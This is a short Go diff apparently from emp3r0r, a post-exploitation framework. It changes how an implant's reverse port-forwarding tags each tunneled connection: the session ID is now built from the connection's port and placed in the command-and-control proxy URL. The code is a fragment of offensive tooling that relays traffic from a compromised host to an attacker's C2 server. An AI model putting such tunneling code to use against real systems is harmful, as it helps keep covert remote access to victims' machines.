@@ -7,12 +7,12 @@ import (
 	"io"
 	"log"
 	"net"
+	"strings"
 	"sync"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -135,12 +135,16 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	port, sessionID string) {
 	var (
-		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
 		err error
 	)
 
 	// serve a TCP connection received on agent side
 	serveConn := func(conn net.Conn) {
+		// tell CC this is a reversed port mapping
+		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
+		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
+		url := emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + shID
+
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := ConnectCC(url)
 		if err != nil {
@@ -152,14 +156,6 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			h2cancel()
 			conn.Close()
 		}()
-
-		// tell CC this is a reversed port mapping
-		shID := fmt.Sprintf("%s_%d-reverse", sessionID, util.RandInt(0, 1024))
-		_, err = h2.Write([]byte(shID))
-		if err != nil {
-			log.Printf("reverse port mapping hello: %v", err)
-			return
-		}
 
 		// iocopy
 		go func() {
